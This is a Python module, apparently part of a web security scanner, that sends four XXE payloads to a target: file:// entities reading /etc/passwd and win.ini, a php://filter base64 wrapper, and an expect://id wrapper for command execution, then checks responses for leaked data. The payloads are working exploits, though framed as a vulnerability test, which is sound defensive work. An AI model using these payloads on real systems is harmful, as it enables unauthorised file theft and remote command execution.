from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_xxe_exfil(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    XXE Data Exfiltration (External Entities).
    """
    # We try to read /etc/passwd or win.ini
    payloads = [
        # 1. Standard Linux /etc/passwd
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
        
        # 2. Windows Win.ini
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]><foo>&xxe;</foo>""",
  
        # 3. PHP Wrapper (Base64 Bypass) - Robust access
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]><foo>&xxe;</foo>""",

        # 4. Expect Wrapper (RCE via XXE)
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>"""
    ]
    
    headers = {"Content-Type": "application/xml"}
    issues = []
    exfiltrated_data = []
    
    for payload in payloads:
        # User requested "server must parse malicious xml" - so we send it
        resp = client.send(scenario.method, scenario.target, form_body=payload, headers=headers)
        
        # Linux Check
        if "root:x:0:0" in resp.text:
            issues.append("XXE Exfiltration Successful (/etc/passwd leaked)")
            exfiltrated_data.append(resp.text[:200])
            
        # Windows Check
        if "boot loader" in resp.text.lower() or "[extensions]" in resp.text.lower():
            issues.append("XXE Exfiltration Successful (Windows File leaked)")
            exfiltrated_data.append(resp.text[:200])
            
        # PHP Base64 Check (looking for start of encoded /etc/passwd)
        # "cm9vd" -> "root"
        if "cm9vd" in resp.text and len(resp.text) > 100:
             issues.append("XXE Exfiltration Successful (Base64 Encoded /etc/passwd leaked)")
             exfiltrated_data.append(resp.text[:200])
             
        # Expect RCE Check
        if "uid=" in resp.text and "gid=" in resp.text:
             issues.append("XXE to RCE Successful (Command Execution via Expect)")
             exfiltrated_data.append(resp.text[:200])
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "xxe_exfil",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }
